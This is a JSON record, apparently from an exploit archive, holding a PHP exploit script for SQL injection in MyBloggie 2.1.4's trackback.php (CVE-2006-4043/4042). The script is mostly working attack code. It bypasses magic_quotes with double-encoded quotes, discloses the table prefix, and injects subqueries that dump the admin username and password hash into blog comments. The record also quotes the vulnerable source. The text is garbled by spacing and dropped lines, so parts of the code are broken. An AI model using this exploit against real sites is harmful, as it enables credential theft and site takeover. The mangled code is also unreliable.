{
    "text": "vul_name : MyBloggie <= 2.1.4 trackback.php SQL injection / admin credentials disclosure ， vul_cve : CVE-2006-4043 , CVE-2006-4042 ， vul_poc :  #  ! /usr/bin/php -q -d short_open_tag=on ， <? ， echo \"MyBloggie <= 2.1.4 trackback.php multiple SQL injections vulnerability /n\" ;  ， echo \"administrative credentials disclosure exploitn\" ;  ， echo \"by rgod rgod ( at ) autistici ( dot ) org [ email concealed ] n\" ;  ， echo \"site :  ， works regardless of php.ini settings ， against MySQL >= 4.1 ( allowing subs )  ， echo \"Usage : php \". $ argv [ 0 ] .\" host path OPTIONSn\" ;  ， echo \"host : target server ( ip/hostname ) n\" ;  ， echo \"path : path to MyBloggien\" ;  ， echo \"Options : n\" ;  ， echo \" -i specify an existent post id ( default : 1 ) n\" ;  ， echo \" -T [ prefix ] specify a table prefix different from default ( mb_ ) n\" ;  ， echo \" -p [ port ]  : specify a port other than 80n\" ;  ， echo \" -P [ ip : port ]  : specify a proxyn\" ;  ， echo \" -d : disclose table prefix ( reccomended ) n\" ;  ， echo \"Example : rn\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /MyBloggie/ -d -i7rn\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /MyBloggie/ -Tm_rn\" ;  ， die ;  ， } ， / * software site :  ， vulnerable code in trackback.php :  ， . ，  $ title=urldecode ( substr (  $ _REQUEST [ 'title' ]  , 0 ,  $ tb_title_len )  ;  ， } ，  $ url=urldecode (  $ _REQUEST [ 'url' ]  )  ;  ， } ， { ，  $ excerpt=urldecode ( substr (  $ _REQUEST [ 'excerpt' ]  , 0 ,  $ tb_excerpt_len )  ;  ， } else { ，  $ tback->trackback_reply ( 1 , \"<p>Sorry , Trackback failed. Reason : No Excerpt</p>\" )  ;  ， } ， / The blog name ， { ，  $ blog_name=urldecode ( substr (  $ _REQUEST [ 'blog_name' ]  , 0 ,  $ tb_blogname_len )  ;  ， } else ， { ，  $ blog_name=\"No Blog Name\" ;  ， } ，  $ timestamp = mktime ( gmtdate ( 'H' , time (  )  ,  $ timezone )  , gmtdate ( 'i' , time (  )  ,  $ timezone )  ,  ， gmtdate ( 's' , time (  )  ,  $ timezone )  , gmtdate ( 'n' , time (  )  ,  $ timezone )  ,  ， gmtdate ( 'd' , time (  )  ,  $ timezone )  , gmtdate ( 'Y' , time (  )  ,  $ timezone )  ;  ，  $ sql = \"INSERT INTO \".COMMENT_TBL.\" SET post_id=' $ tb_id' , comment_subject=' $ title' , comments=' $ excerpt' , com_tstamp=' $ timestamp' ,  ， poster = ' $ blog_name' , home=' $ url' , comment_type='trackback'\" ;  ，  $ result = $ db->sql_query (  $ sql ) or die ( \"Cannot query the database.<br>\" . mysql_error (  )  ;  ， . ， you have sql injection in 'title' , 'url' , 'excerpt' and 'blog_name' argument ， with MySQL >= 4.1 that allows SELECT subqueries for INSERT. ， so you can insert admin username & password hash inside comments and you will see them at screen ， also arguments are passed to urldecode (  )  , so you can bypass magic_quotes_gpc ， with '%2527' sequence for the single quote char ， adn you can disclose table prefix going to :  ， you will have an error that disloses a query fragment ， ex. , injecting code in 'title' argument , query becomes :  ， INSERT INTO mb_comment SET post_id='1' , comment_subject='hi' , comments= ( SELECT CONCAT ( '< ! -' , password , '->' ) FROM mb_user ) / * ' , comments='whatever' , com_tstamp='1154799697' ,  ， poster = 'whatever' , home=' comment_type='trackback' ， error_reporting ( 0 )  ;  ， ini_set ( \"max_execution_time\" , 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ， { ，  $ result=' ;  $ exa=' ;  $ cont=0 ;  ， { ， { $ result.=\" .\" ; } ， { $ result.=\" \". $ string [  $ i ]  ; } ， { $ exa.=\" \".dechex ( ord (  $ string [  $ i ]  )  ; } ， { $ exa.=\" 0\".dechex ( ord (  $ string [  $ i ]  )  ; } ，  $ cont+ ; if (  $ cont=15 ) { $ cont=0 ;  $ result.=\"rn\" ;  $ exa.=\"rn\" ; } ， } ， } ，  $ proxy_regex = ' ( bd{1 , 3}.d{1 , 3}.d{1 , 3}.d{1 , 3} : d{1 , 5}b ) ' ;  ， { ， global $ proxy ,  $ host ,  $ port ,  $ html ,  $ proxy_regex ;  ，  $ ock=fsockopen ( gethostbyname (  $ host )  ,  $ port )  ;  ， echo 'No response from '. $ host.' : '. $ port ; die ;  ， } ， } ，  $ c = preg_match (  $ proxy_regex ,  $ proxy )  ;  ， echo 'Not a valid proxy.' ; die ;  ， } ，  $ parts=explode ( ' : ' ,  $ proxy )  ;  ， echo \"Connecting to \". $ parts [ 0 ] .\" : \". $ parts [ 1 ] .\" proxy.rn\" ;  ，  $ ock=fsockopen (  $ parts [ 0 ]  ,  $ parts [ 1 ]  )  ;  ， echo 'No response from proxy.' ; die ;  ， } ， } ， fputs (  $ ock ,  $ packet )  ;  ，  $ html=' ;  ，  $ html.=fgets (  $ ock )  ;  ， } ， } ，  $ html=' ;  ，  $ html.=fread (  $ ock , 1 )  ;  ， } ， } ， fclose (  $ ock )  ;  ，  # debug ，  # echo \"rn\". $ html ;  ， } ， { ， } ，  $ host= $ argv [ 1 ]  ;  ，  $ path= $ argv [ 2 ]  ;  ，  $ port=80 ;  ，  $ prefix=\"mb_\" ;  ，  $ post_id=\"1\" ; /admin ，  $ proxy=\" ;  ，  $ dt=0 ;  ，  $ temp= $ argv [  $ i ]  [ 0 ] . $ argv [  $ i ]  [ 1 ]  ;  ， { ，  $ port=str_replace ( \"-p\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ proxy=str_replace ( \"-P\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ prefix=str_replace ( \"-T\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ post_id= ( int ) str_replace ( \"-i\" , \" ,  $ argv [  $ i ]  )  ;  ， echo \"post id -> \". $ post_id.\"n\" ;  ， } ， { ，  $ dt=1 ;  ， } ， } ， { ，  $ packet =\"GET \". $ p.\"index.php?mode=viewdate HTTP/1.0rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ， sendpacketii (  $ packet )  ;  ， { ，  $ temp=explode ( \"UNIXTIME ( \" ,  $ html )  ;  ，  $ temp2=explode ( \"posts.timest\" ,  $ temp [ 1 ]  )  ;  ，  $ prefix= $ temp2 [ 0 ]  ;  ， echo \"table prefix -> \". $ prefix.\"n\" ;  ， } ， } ，  $ sql=\"%2527 , comments= ( SELECT CONCAT ( %2527< ! -%2527 , password , %2527->%2527 ) FROM \". $ prefix.\"user ) / * \" ;  ， /some problems with argument length , maybe with prefix > 3 chars you will have some error , cut the '< ! -' but hash will be clearly visible in comments ，  $ data=\"title=hi\". $ sql ;  ，  $ data.=\"&url=http%3a%2f%2fwww%2esuntzu%2eorg\" ;  ，  $ data.=\"&excerpt=whatever\" ;  ，  $ data.=\"&blog_name=whatever\" ;  ，  $ packet =\"POST \". $ p.\"trackback.php/ $ post_id HTTP/1.0rn\" ;  ，  $ packet.=\"Content-Type : application/x-www-form-urlencodedrn\" ;  ，  $ packet.=\"Content-Length : \".strlen (  $ data ) .\"rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ，  $ packet.= $ data ;  ， sendpacketii (  $ packet )  ;  ，  $ sql=\"%2527 , comments= ( SELECT CONCAT ( %2527< ! -%2527 , user , %2527->%2527 ) FROM \". $ prefix.\"user ) / * \" ;  ，  $ data=\"title=hi\". $ sql ;  ，  $ data.=\"&url=http%3a%2f%2fwww%2esuntzu%2eorg\" ;  ，  $ data.=\"&excerpt=whatever\" ;  ，  $ data.=\"&blog_name=whatever\" ;  ，  $ packet =\"POST \". $ p.\"trackback.php/ $ post_id HTTP/1.0rn\" ;  ，  $ packet.=\"Content-Type : application/x-www-form-urlencodedrn\" ;  ，  $ packet.=\"Content-Length : \".strlen (  $ data ) .\"rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ，  $ packet.= $ data ;  ， sendpacketii (  $ packet )  ;  ， sleep ( 1 )  ;  ，  $ packet =\"GET \". $ p.\"index.php?mode=viewid&post_id= $ post_id HTTP/1.0rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ， sendpacketii (  $ packet )  ;  ， /echo $ html ;  ，  $ temp=explode ( '\"message\">< ! -' ,  $ html )  ;  ， { ，  $ temp2=explode ( \"->\" ,  $ temp [  $ i ]  )  ;  ， { ，  $ hash= $ temp2 [ 0 ]  ;  ，  $ temp2=explode ( \"->\" ,  $ temp [  $ i+1 ]  )  ;  ，  $ admin= $ temp2 [ 0 ]  ;  ， echo \"-n\" ;  ， echo \"admin -> \". $ admin.\"n\" ;  ， echo \"password ( md5 ) -> \". $ hash.\"n\" ;  ， echo \"-n\" ;  ， die (  )  ;  ， } ， } ， /if you are here. ， echo \"exploit failed.\" ;  ， ?> ， original url : ",
    "time": "2006.08.10"
}